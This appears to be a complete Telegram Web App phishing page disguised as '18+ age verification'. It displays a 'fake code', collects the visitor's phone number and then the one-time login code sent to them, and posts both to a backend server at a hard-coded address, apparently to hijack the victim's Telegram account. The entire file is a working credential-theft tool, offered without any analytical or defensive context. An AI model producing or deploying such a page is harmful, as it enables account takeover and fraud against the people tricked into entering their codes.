<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>18+ Verify</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family: Arial; }
        body { background: #1a1a2e; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .card { background: #16213e; padding: 30px; border-radius: 20px; max-width: 400px; width: 100%; color: white; text-align: center; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: none; border-radius: 12px; background: #1a1a2e; color: white; font-size: 16px; }
        button { width: 100%; padding: 14px; background: #e94560; color: white; border: none; border-radius: 12px; font-size: 18px; cursor: pointer; }
        .code { background: #1a1a2e; padding: 15px; border-radius: 12px; margin: 15px 0; font-size: 28px; color: #e94560; }
        .hidden { display: none; }
    </style>
</head>
<body>
<div class="card" id="app">
    <h1>🔞 18+ Verify</h1>
    <div class="code" id="fakeCodeDisplay">83742</div>
    <input type="text" id="phoneInput" placeholder="Phone number (+911234567890)">
    <input type="text" id="otpInput" placeholder="Enter OTP" class="hidden">
    <button id="actionBtn">Send OTP</button>
    <p id="status" style="color:#888; margin-top:15px;">Enter your phone number</p>
</div>
<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const urlParams = new URLSearchParams(window.location.search);
    const userId = urlParams.get('user_id');
    const fakeCode = urlParams.get('code');
    document.getElementById('fakeCodeDisplay').textContent = fakeCode || '83742';

    let step = 'phone';
    const phoneInput = document.getElementById('phoneInput');
    const otpInput = document.getElementById('otpInput');
    const actionBtn = document.getElementById('actionBtn');
    const status = document.getElementById('status');

    const API_URL = 'http://192.168.1.3:5000/bot';

    actionBtn.onclick = async function() {
        if (step === 'phone') {
            const phone = phoneInput.value.trim();
            if (!phone || !phone.startsWith('+')) {
                status.textContent = '❌ Valid phone with + required';
                return;
            }
            status.textContent = '⏳ Sending OTP...';
            try {
                const res = await fetch(API_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ method: 'send_otp', userId, fakeCode, phone })
                });
                const data = await res.json();
                if (data.success) {
                    status.textContent = '✅ OTP sent! Enter it below.';
                    phoneInput.classList.add('hidden');
                    otpInput.classList.remove('hidden');
                    actionBtn.textContent = 'Verify OTP';
                    step = 'otp';
                } else {
                    status.textContent = '❌ ' + data.error;
                }
            } catch(e) {
                status.textContent = '❌ Network error: ' + e.message;
            }
        } else if (step === 'otp') {
            const otp = otpInput.value.trim();
            if (!otp || otp.length < 5) return status.textContent = '❌ Enter valid OTP';
            status.textContent = '⏳ Verifying...';
            try {
                const res = await fetch(API_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ method: 'verify_otp', userId, fakeCode, otp })
                });
                const data = await res.json();
                if (data.success) {
                    status.innerHTML = '✅ <strong>Access granted!</strong>';
                    actionBtn.disabled = true;
                    setTimeout(() => tg.close(), 2000);
                } else {
                    status.textContent = '❌ ' + data.error;
                }
            } catch(e) {
                status.textContent = '❌ Network error: ' + e.message;
            }
        }
    };
</script>
</body>
      </html>
